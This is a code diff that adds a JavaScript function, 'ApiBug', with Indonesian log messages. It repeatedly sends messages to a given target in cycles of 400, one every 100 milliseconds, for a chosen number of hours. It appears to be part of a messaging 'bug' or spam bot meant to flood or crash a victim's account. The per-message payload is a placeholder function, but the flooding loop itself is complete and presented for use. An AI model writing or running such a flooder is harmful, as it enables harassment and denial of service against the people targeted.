@@ -1,0 +1,33 @@
+async function ApiBug(durationHours, target) { 
+const totalDurationMs = durationHours * 60 * 60 * 1000;
+const startTime = Date.now(); let count = 0;
+
+const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+        console.log(`Stopped after sending ${count} messages`);
+        return;
+       }
+
+        try {
+    if (count < 400) {
+        await Promise.all([
+            NamaFunction(target, false),
+          ]);
+        console.log(chalk.blue(`API BUG (DELAY)${count}/400 ke ${target}`));
+        count++;
+        setTimeout(sendNext, 100);
+    } else {
+        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
+        count = 0;
+        console.log(chalk.red("➡️ Next 400 Messages"));
+        setTimeout(sendNext, 100);
+    }
+} catch (error) {
+    console.error(`❌ Error saat mengirim: ${error.message}`);
+    setTimeout(sendNext, 100);
+}
+};
+
+sendNext();
+
+}
